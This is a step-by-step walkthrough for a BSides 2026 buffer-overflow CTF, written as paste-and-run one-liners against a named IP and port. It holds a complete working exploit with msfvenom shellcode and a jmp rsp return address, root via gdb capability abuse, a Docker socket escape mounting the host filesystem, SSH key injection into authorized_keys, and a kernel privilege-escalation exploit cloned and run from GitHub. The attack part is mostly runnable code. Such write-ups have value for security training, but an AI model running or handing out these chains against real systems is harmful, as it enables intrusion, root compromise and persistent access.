---
title: "BSides 2026 BOF CTF - PoC One-Liners"
type: technique
tags: [ctf, bof, poc, rop, shellcode, privesc, dirtyfrag]
phase: exploitation
date_created: 2026-05-22
date_updated: 2026-06-01
sources: [ctf-bsides-buffer-2026-poc]
---

# BSides 2026 BOF CTF - PoC One-Liners

Manual step-by-step walkthrough. Every command is a one-liner; paste and run.

**Target:** `$TARGET:$PORT` (set in Section 0) | **Binary:** `adminpanel` (given) | **Flags:** 4

---

## 0. Variables

```bash
TARGET=85.217.171.62; PORT=8443
```

---

## 1. Get the Binary

```bash
# Organizer: extract binary from container and download to local machine (then upload to CTFd)
sshpass -p '<ADMIN_PASSWORD>' ssh -o StrictHostKeyChecking=no ubuntu@${TARGET} \
  "echo <ADMIN_PASSWORD> | sudo -S docker cp \$(echo <ADMIN_PASSWORD> | sudo -S docker ps --filter name=bof-ctf -q):/opt/adminpanel /tmp/adminpanel"
sshpass -p '<ADMIN_PASSWORD>' scp -o StrictHostKeyChecking=no ubuntu@${TARGET}:/tmp/adminpanel ./adminpanel

# Participant: binary downloaded from CTFd challenge page

# Verify
file adminpanel && md5sum adminpanel
```

---

## 2. Recon

```bash
nmap -sV -p $PORT $TARGET
```

Expected: `8443/tcp open  unknown` with banner `=== Auth Gateway v1.3 ===`

---

## 3. Binary Analysis

```bash
file adminpanel
checksec --file=adminpanel
strings adminpanel
objdump -d adminpanel | awk '/ff e4/{print "jmp rsp @ 0x"$1}'
ROPgadget --binary adminpanel | grep "jmp rsp"
```

Key findings: NX disabled, no canary, no PIE. `jmp rsp` gadget at `0x401210`.

---
## 4. GDB + GEF Setup

```bash
# Install GEF (one-liner, writes to ~/.gdbinit)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Verify
gdb -q -nx -batch -ex 'python import gef; print(gef.__version__)' 2>/dev/null || gdb -q ./adminpanel -ex 'gef help' -ex quit 2>&1 | grep -i gef | head -3

# Disable ASLR for local testing (re-enable after: echo 2 | sudo tee ...)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Enable core dumps + local core pattern
ulimit -c unlimited && echo core | sudo tee /proc/sys/kernel/core_pattern
```

---

## 5. Find RIP Offset

**Method A — pwntools cyclic + Coredump (no interaction needed):**

```bash
python3 -c "from pwn import *; context.arch='amd64'; p=process('./adminpanel'); p.recvuntil(b'Authentication key: '); p.send(cyclic(300)); p.wait(timeout=2)"
```

```bash
python3 -c "from pwn import *; context.arch='amd64'; core=Coredump('./core.<id>'); print('offset:', cyclic_find(core.rsp[:4]))"
```

**Method B — GEF pattern (interactive, use inside a GDB session):**

```sh
pip install pwntools --break-system-packages
```

```sh
python3 -c "from pwn import *; context.arch='amd64'; print(cyclic(300).decode())" > /tmp/pattern.txt
cat /tmp/pattern.txt
```

```sh
python3 -c "from pwn import *; context.arch='amd64'; context.log_level='debug'; p=process('./adminpanel'); p.recvuntil(b'Authentication key: '); p.send(cyclic(300)); p.wait(timeout=3)"
```

```sh
python3 -c "from pwn import *; context.arch='amd64'; core=Coredump('./core.1906646'); print('Offset:', cyclic_find(p64(core.fault_addr)))"
```

Expected: `offset: 72`

---

## 6. Bad Char Scan

Expected: `Bad chars: ['0xa', '0xb', '0xd', '0x20']`
Note: `\x00` is clean — `read()` is not null-terminated.

**GEF visual inspection (manual alternative):** Send the payload, then examine the buffer in GDB+GEF. Look for gaps or repeated bytes where the sequence should be continuous.

```bash
# Send bad char payload, crash, then open core in GEF
python3 -c "from pwn import *; context.arch='amd64'; context.log_level='error'; p=process('./adminpanel'); p.recvuntil(b'Authentication key: '); p.send(b'A'*72 + b'B'*8 + bytes(range(0x01,0x100))); p.wait(timeout=2)"
```

```bash
# Open core in GEF — telescope and x/bx give colour-coded display
gdb -q adminpanel core.<id> -ex 'x/255bx $rsp-72'
```

Scan the hex output for missing values in the `01 02 03 ...` sequence — each gap is a bad char.

```powershell
#0  0x0000000000401278 in ?? ()
0x7fffffffe100: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe108: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe110: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe118: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe120: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe128: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe130: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe138: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe140: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe148: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42

0x7fffffffe150: 0x01    0x02    0x03    0x04    0x05    0x06    0x07    0x08 # Counting starts from 0x01
0x7fffffffe158: 0x09    0x00    0x00    0x0c    0x00    0x0e    0x0f    0x10 # breaks at 0x0a, 0x0b, 0x0d
0x7fffffffe160: 0x11    0x12    0x13    0x14    0x15    0x16    0x17    0x18
0x7fffffffe168: 0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f    0x00 # breaks at 0x20
0x7fffffffe170: 0x21    0x22    0x23    0x24    0x25    0x26    0x27    0x28
0x7fffffffe178: 0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f    0x30
0x7fffffffe180: 0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38
0x7fffffffe188: 0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f    0x40
0x7fffffffe190: 0x41    0x42    0x43    0x44    0x45    0x46    0x47    0x48
0x7fffffffe198: 0x49    0x4a    0x4b    0x4c    0x4d    0x4e    0x4f    0x50
0x7fffffffe1a0: 0x51    0x52    0x53    0x54    0x55    0x56    0x57    0x58
0x7fffffffe1a8: 0x59    0x5a    0x5b    0x5c    0x5d    0x5e    0x5f    0x60
0x7fffffffe1b0: 0x61    0x62    0x63    0x64    0x65    0x66    0x67    0x68
0x7fffffffe1b8: 0x69    0x6a    0x6b    0x6c    0x6d    0x6e    0x6f    0x70
0x7fffffffe1c0: 0x71    0x72    0x73    0x74    0x75    0x76    0x77    0x78
0x7fffffffe1c8: 0x79    0x7a    0x7b    0x7c    0x7d    0x7e    0x7f    0x80
0x7fffffffe1d0: 0x81    0x82    0x83    0x84    0x85    0x86    0x87    0x88
0x7fffffffe1d8: 0x89    0x8a    0x8b    0x8c    0x8d    0x8e    0x8f    0x90
0x7fffffffe1e0: 0x91    0x92    0x93    0x94    0x95    0x96    0x97    0x98
0x7fffffffe1e8: 0x99    0x9a    0x9b    0x9c    0x9d    0x9e    0x9f    0xa0
0x7fffffffe1f0: 0xa1    0xa2    0xa3    0xa4    0xa5    0xa6    0xa7    0xa8
0x7fffffffe1f8: 0xa9    0xaa    0xab    0xac    0xad    0xae    0xaf        
```



---

## 7. Verify Shellcode Has No Bad Chars

```bash
python3 -c "from pwn import *; context.arch='amd64'; sc=asm(shellcraft.sh()); BAD=(0x0a,0x0b,0x0d,0x20); assert not any(b in sc for b in BAD),'BAD CHAR IN SHELLCODE'; print('[+] clean:', sc.hex())"
```

Shellcode hex (verified): `6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05`

```sh
msfvenom -p linux/x64/exec CMD=/bin/sh -b '\x00\x0a\x0b\x0d\x20' -f python -v shellcode
```

```sh
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x14\x83\xcc"
shellcode += b"\x30\x02\x04\xf3\x17\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x5c\x3b\xe3\x52\x6b"
shellcode += b"\x6a\xdc\x64\x7c\x83\x55\x60\x56\x5b\xa1\x71"
shellcode += b"\x7c\xae\xaf\x64\x5c\x56\x1b\x1f\x14\x83\xcc"
shellcode += b"\x1f\x60\x6d\x9d\x38\x67\xeb\xcc\x66\x55\x50"
shellcode += b"\xad\x7d\x2f\xdb\xc3\x35\x02\x04\xf3\x17"
```


---

## 8. Flag 1 — BOF → ctf shell → bof.txt

```python
import socket, struct, time

# msfvenom -p linux/x64/exec CMD=/bin/sh -b '\x00\x0a\x0b\x0d\x20' -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x14\x83\xcc"
shellcode += b"\x30\x02\x04\xf3\x17\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x5c\x3b\xe3\x52\x6b"
shellcode += b"\x6a\xdc\x64\x7c\x83\x55\x60\x56\x5b\xa1\x71"
shellcode += b"\x7c\xae\xaf\x64\x5c\x56\x1b\x1f\x14\x83\xcc"
shellcode += b"\x1f\x60\x6d\x9d\x38\x67\xeb\xcc\x66\x55\x50"
shellcode += b"\xad\x7d\x2f\xdb\xc3\x35\x02\x04\xf3\x17"

TARGET = '85.217.171.62'; PORT = 8443

s = socket.socket()
s.connect((TARGET, PORT))
s.settimeout(5)
print(s.recv(512))

payload = b'A'*72 + struct.pack('<Q', 0x401210) + b'\x90'*32 + shellcode
s.send(payload)
time.sleep(0.3)

s.send(b'id\n')
time.sleep(0.6)
print(s.recv(4096).decode(errors='replace').strip())

s.send(b'cat /home/ctf/bof.txt\n')
time.sleep(0.6)
print(s.recv(4096).decode(errors='replace').strip())
```

Expected: `uid=1000(ctf)` then `BSIDES{A1b2C3d4E5f6G7h8I9jK}`

---

## 9. Flag 2 — GDB Cap Abuse → Container Root → docker.txt

Run inside the ctf shell gained in step 8:

```bash
getcap /usr/bin/gdb
```

```bash
gdb -nx -ex 'python import os; os.setuid(0); os.setgid(0)' -ex 'shell id' -ex 'shell cat /root/docker.txt' -ex quit
```

 `uid=0(root)` then `BSIDES{L9m8N7o6P5q4R3s2T1uV}`

Get root shell
```sh
gdb -nx -ex 'python import os; os.setuid(0); os.setgid(0)' -ex 'shell bash' -ex quit
```


## 10. Flag 3 — Docker Socket Escape → user.txt

Still in the container root shell:

```bash
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine sh -c 'cat /host/home/ubuntu/user.txt'
```

Expected: `BSIDES{Q1w2E3r4T5y6U7i8O9pA}`

---

## 11. Flag 4 — SSH Key Injection + DirtyFrag LPE → root_flag binary

Commands run from attacker machine (Kali). Steps 2 and 3 run inside the container root shell.

```bash
# Step 1 — generate key pair on attacker
ssh-keygen -t ed25519 -f /tmp/ctf_key -N '' -q && cat /tmp/ctf_key.pub | base64 -w0 && echo
```

- Copy base64 into next step

```bash
# Step 2 — base64-encode and inject via docker socket (run in container root shell)
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine sh -c 'echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUpmSGtyZGZPcUN1RXBzaWUvMHdxdWpQMk9qWU1icnNOdkJYWlpsTlFNeTggcm9vdEBrYWxpCg==" | base64 -d >> /host/home/ubuntu/.ssh/authorized_keys && chmod 700 /host/home/ubuntu/.ssh && chmod 600 /host/home/ubuntu/.ssh/authorized_keys && chown -R 1000:1000 /host/home/ubuntu/.ssh && echo DONE'
```

```sh
# Change target ip and get access to machine
ssh -i /tmp/ctf_key -o StrictHostKeyChecking=no ubuntu@192.168.88.44 
```


```bash
# Step 3 — SSH in as ubuntu, confirm flag 3 access
cat user.txt
# BSIDES{Q1w2E3r4T5y6U7i8O9pA}
```

```bash
# Step 4 — clone, compile, run dirtyfrag LPE, run root_flag binary
ssh -i /tmp/ctf_key -o StrictHostKeyChecking=no ubuntu@${TARGET} "git clone -q https://github.com/V4bel/dirtyfrag /tmp/df 2>/dev/null; cd /tmp/df && gcc -O0 -Wall -o exp exp.c -lutil 2>/dev/null && printf '/root/root_flag\nexit\n' | ./exp"
```

```sh
ubuntu@ubuntu:/tmp/df$ ./exp
id
# uid=0(root) gid=0(root) groups=0(root)
```

Expected: root shell, then `BSIDES{Z9x8C7v6B5n4M3k2J1hG}`

---

## Troubleshooting

| Symptom                              | Fix                                                                 |
| ------------------------------------ | ------------------------------------------------------------------- |
| Payload lands, no shell              | Bad char in shellcode — recheck `\x0a \x0b \x0d \x20`               |
| `getcap` shows no caps on gdb        | `setcap` failed during build — redeploy                             |
| Docker socket not found              | Container missing `-v /var/run/docker.sock:/var/run/docker.sock`    |
| SSH key injection: Permission denied | `.ssh/` perms wrong — 700 dir, 600 keys, chown 1000:1000            |
| DirtyFrag no root shell              | Kernel patched — `uname -r` and check CVE-2026-43284 target range   |
| Core not created for bad char script | `ulimit -c unlimited` + `echo core > /proc/sys/kernel/core_pattern` |
